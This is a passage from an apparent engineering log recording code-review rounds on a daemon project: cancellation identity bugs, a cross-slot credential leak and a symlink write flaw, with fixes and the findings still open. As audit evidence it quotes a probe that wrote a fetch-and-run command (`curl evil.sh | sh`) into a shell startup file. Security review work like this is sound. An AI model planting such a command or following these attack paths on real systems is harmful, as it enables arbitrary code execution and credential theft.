...
- **2026-07-27** (second gate run, `NEEDS FIXES @ 1360bfd`): **the fix round closed three findings, regressed two, and left four partly open** - recorded here because the plan must not read as if the remediation landed clean. CLOSED: B1 (20 alias shapes probed), M1, M8. REGRESSED by the fix itself: **M3** (the `unreadable` early-return made `escalate`'s SIGKILL unreachable, so a wedged unattended daemon was never force-killed) and **M4** (the identity gate matched neither shape a RESUMED workflow wears, since `resume_workflow` re-stamps the entry with the `workflows resume` CLI's pid - cancel sent no signal and still reported success). Both fixed in this round, with the stop loop now asking `_is_zombie` directly instead of inferring an exit from silence.
  ...
  Two of the four then got their own fix rather than a patch, because both were the shape of the design being wrong rather than the code:
  - **NEW BLOCKING (cross-slot), FIXED.** `_confine_pack_root` was parameterised on THIS session's run root, so `location: <other slot>/run` reached a neighbouring team's `run/package/agent.yaml` and leaked its `${VAR}`s through that slot's `/api/credential/value` - probe-confirmed, and multi-slot is the normal topology (`webapp/server.py` mounts a setup app per slot under one BOBI_HOME). The boundary is now "**no team's** run/ is a pack root", discovered from the library at request time via `_all_run_roots`, rather than "not mine".
  - **M2's follow-symlinks change REVERTED.** It traded a data-loss bug for a security hole: `_pin` wrote THROUGH a link planted at `run/state/scripts/<monitor>.sc.sh` - a directory `runtime_guard` does not lock and agent tools can write - and chmodded the victim `+x` (probe wrote `curl evil.sh | sh` into `~/.zshrc`; `_verify_integrity` cannot see it, since it re-reads through the same link). A dangling link additionally made `mkdir(parents=True)` fabricate a tree outside the root. `fsutil` now REFUSES a symlinked target (`SymlinkedTarget`), naming the file: replacing it is silent data loss, following it is an arbitrary write, and a durable state file here is never legitimately a link. Operators with a dotfile-managed `~/.codex/config.toml` now get a loud error instead of either silent outcome - a deliberate behaviour change.

- **2026-07-27** (third round, `6c172d9`): the last three MAJORs closed, so the branch carries no known-open MAJOR. Cancel identity is now per-RUN (`subagent_identity`) rather than per-KIND - a recycled pid inherited by a DIFFERENT live sub-agent wore the same bootstrap and was a valid SIGTERM target, and the joined-argv match fired on any command line mentioning both markers. Cancel also stopped erasing what it refuses to touch: three outcomes now (`CancelResult`), because a bare bool made the CLI say "No running sub-agent" about a live process, and both callers - CLI and the unattended reconciler - report the refusal. And `_pin`'s exec bit settles BEFORE the swap via `atomic_write_text(extra_mode=...)`, closing the FileNotFoundError window a concurrent `recache()` opened.

  **STILL OPEN, MINOR only:** M5's content-vs-recorded-sha ordering (unique temp names fixed the collision, not the ordering) plus a `FileNotFoundError` race from chmod-after-swap; M7's guard still misses eight shapes including `yaml.safe_dump`, and `/api/file` still truncate-writes team source; `is_subagent_argv` false-positives on any argv mentioning both markers (it joins argv, so `bash -c 'echo bobi.subagent && echo _run_agent_entry'` matches) and is per-KIND rather than per-run, so a recycled pid inherited by a DIFFERENT sub-agent is still a valid target. These want a third lane, not a fourth patch round on this branch.
